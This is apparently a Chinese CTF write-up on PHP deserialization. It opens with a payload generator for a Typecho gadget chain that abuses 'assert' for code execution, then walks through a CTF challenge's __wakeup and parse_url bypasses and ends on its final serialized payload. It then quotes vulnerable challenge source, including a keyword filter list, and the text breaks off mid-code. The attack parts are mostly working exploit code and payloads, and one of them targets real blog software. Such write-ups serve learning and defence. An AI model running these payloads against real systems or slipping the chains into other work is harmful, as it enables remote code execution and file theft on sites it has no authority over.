<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">RSS1</span> = <span class="string">&#x27;RSS 1.0&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">RSS2</span> = <span class="string">&#x27;RSS 2.0&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">ATOM1</span> = <span class="string">&#x27;ATOM 1.0&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">DATE_RFC822</span> = <span class="string">&#x27;r&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">DATE_W3CDTF</span> = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">EOL</span> = <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_type</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_items</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_type = <span class="variable language_">$this</span>::<span class="variable constant_">RSS2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;title&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;link&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;date&#x27;</span> =&gt; <span class="number">1508895132</span>,</span><br><span class="line">            <span class="string">&#x27;category&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">Typecho_Request</span>()),</span><br><span class="line">            <span class="string">&#x27;author&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Typecho_Request</span>(),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;adapter&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Typecho_Feed</span>(),</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;typecho_&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>));</span><br></pre></td></tr></table></figure>
<h5 id="php反序列化在CTF中的玩儿法"><a href="#php反序列化在CTF中的玩儿法" class="headerlink" title="php反序列化在CTF中的玩儿法"></a>php反序列化在CTF中的玩儿法</h5><p>PS：忘记是哪个CTF了，反正做了一天才做出来，可能还是自己太菜。<br>index.php代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&quot;payload&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Missing parameter&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hack attacked!!!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$payload</span>))&#123;  </span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>],<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$value</span>)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Missing parameters&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>其中file 是我们传入的参数，可利用文件包含进行文件读取（这里讲序列化就不讲这部分了），但是因为参数不能包含flag关键字，所以我们不能直接读取flag。另外我们也知道了index.php会对我们传入的payload参数调用parse_url函数进行解析，然后对我们得每个参数进行正则匹配，匹配到flag就直接退出，这里肯定需要技巧绕过的。我们先看提示的hint.php<br>hint.php代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;       </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;        </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="title function_ invoke__">get_object_vars</span>(<span class="variable">$this</span>) <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="variable">$k</span> = <span class="literal">null</span>;         </span><br><span class="line">            &#125;          </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Waking upn&quot;</span>;      </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>) </span>&#123;           </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$handle</span>;       </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">getFlag</span>();   </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;      </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;      </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;      </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token_flag</span>;         </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token_flag = <span class="variable language_">$this</span>-&gt;token = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>));      </span><br><span class="line">    &#125;         </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token_flag = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>));          </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token === <span class="variable language_">$this</span>-&gt;token_flag)&#123;     </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;      </span><br><span class="line">                <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file,<span class="literal">true</span>);               </span><br><span class="line">            &#125;            </span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们一眼就可以看出getFlag()函数是我们需要利用的点。而handle类调用了getFlag，但是因为handle类还有一个wakeup魔术方法，这个方法会把我们的参数全部设置为null，所以我们要绕过wakeup。通过上面写的php发序列化的基础知识我们知道:</p>
<blockquote>
<p>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行  </p>
</blockquote>
<p>所以wakeup很好绕过,现在需要想怎么绕过index.php中的parse_url，通过网上找资料我们可以知道：</p>
<blockquote>
<p>parse_url函数在解析url时存在的bug通过：&#x2F;&#x2F;&#x2F;x.php?key&#x3D;value的方式可以使其返回False<br>PS：详细内容参考一叶飘零师傅的blog —– <a href="https://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/">https://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/</a></p>
</blockquote>
<p>现在两个问题都解决了，但是还有一个问题Flag类中有两个md5(rand(1,10000)),它们生成token和token_flag。其中Flag类的__constuct在我们序列化的时候就会触发并赋值一个token_flag&#x3D;token&#x3D;MD5(rand(1,10000))。当我们进行反序列化利用getFlag函数的时候，getFlag函数会赋值token_flag&#x3D;md5(rand(1,10000))，只有这个token_flag和我们一开始传入的token一致才能触发getFlag的读取文件操作。而按照我们的常识来说这是不可能碰撞成功的(因为服务端的token_flag每次都会变)。<br>那么这个问题怎么解决呢？—————-    可以用php的引用赋值来绕过。比如：<br>$test_a &#x3D; 10;<br>$test_b &#x3D; &amp;a;<br>$test_c&#x3D;$test_a+10;<br>最后$test_b的值为20 因为$test_b 指向的是$test_a的地址，所以$test_a是多少$test_b也是多少。<br>现在我们来构造payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="title function_ invoke__">get_object_vars</span>(<span class="variable">$this</span>) <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="variable">$k</span> = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Waking up\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$handle</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$handle</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$token_flag</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token_flag = <span class="variable language_">$this</span>-&gt;token = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line"> &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token_flag = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;token === <span class="variable language_">$this</span>-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;</span><br><span class="line">                <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file,<span class="literal">true</span>); </span><br><span class="line">        &#125;  </span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>(<span class="string">&quot;flag.php&quot;</span>); <span class="comment">//创建时会调用 __construct__ 此时 $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));</span></span><br><span class="line"><span class="variable">$b</span>-&gt;token=&amp;<span class="variable">$b</span>-&gt;token_flag; <span class="comment">//这里把token的值和token_flag的值绑在一起了。这样反序列化时$this-&gt;token_flag变化token也跟着变化</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Handle</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>最终传入payload:</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?file=hint.php&amp;payload=O:<span class="number">6</span>:<span class="string">&quot;Handle&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;%00Handle%00handle&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">32</span>:<span class="string">&quot;85f3375756047fba207ce9b85780313b&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;token_flag&quot;</span>;R:<span class="number">4</span>;&#125;&#125; //注意s:<span class="number">14</span>又<span class="number">0x00</span>不可见字符，所以需要补%00，从字符长度也可看出异常。另外Handle:<span class="number">2</span> 是为了绕过waf。</span><br></pre></td></tr></table></figure>

<h4 id="i春秋的公益赛返序列化利用链"><a href="#i春秋的公益赛返序列化利用链" class="headerlink" title="i春秋的公益赛返序列化利用链"></a>i春秋的公益赛返序列化利用链</h4><p><a href="http://www.zip直接源码泄露进行审计/">www.zip直接源码泄露进行审计</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;你还没有登陆呢！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$users</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$users</span>-&gt;<span class="title function_ invoke__">update</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>从update.php可以知道登录的用户可以打到flag，但是我们不知道admin的密码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//lib.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$parm</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$array</span>= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="variable">$array</span>,<span class="string">&#x27;hacker&#x27;</span>,<span class="variable">$parm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$mysqli</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dbCtrl</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;id=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;id)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]=<span class="variable language_">$this</span>-&gt;id;  </span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你的ID是&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你好！&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Info</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getNewinfo</span>());</span><br><span class="line">        <span class="variable">$age</span>=<span class="variable">$Info</span>-&gt;age;</span><br><span class="line">        <span class="variable">$nickname</span>=<span class="variable">$Info</span>-&gt;nickname;</span><br><span class="line">        <span class="variable">$updateAction</span>=<span class="keyword">new</span> <span class="title class_">UpdateHelper</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>],<span class="variable">$Info</span>,<span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$age</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        <span class="variable">$nickname</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">safe</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Info</span>(<span class="variable">$age</span>,<span class="variable">$nickname</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname-&gt;<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$age</span>,<span class="variable">$nickname</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age=<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname=<span class="variable">$nickname</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$argument</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;CtrlCase-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$argument</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$newInfo</span>,<span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$newInfo</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$newInfo</span>);</span><br><span class="line">        <span class="variable">$upDate</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dbCtrl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span>=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span>=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&quot;noob123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mysqli=<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$this</span>-&gt;hostname, <span class="variable">$this</span>-&gt;dbuser, <span class="variable">$this</span>-&gt;dbpass, <span class="variable">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="variable language_">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$result</span>=<span class="variable language_">$this</span>-&gt;mysqli-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;s&#x27;</span>, <span class="variable">$this</span>-&gt;name);</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ 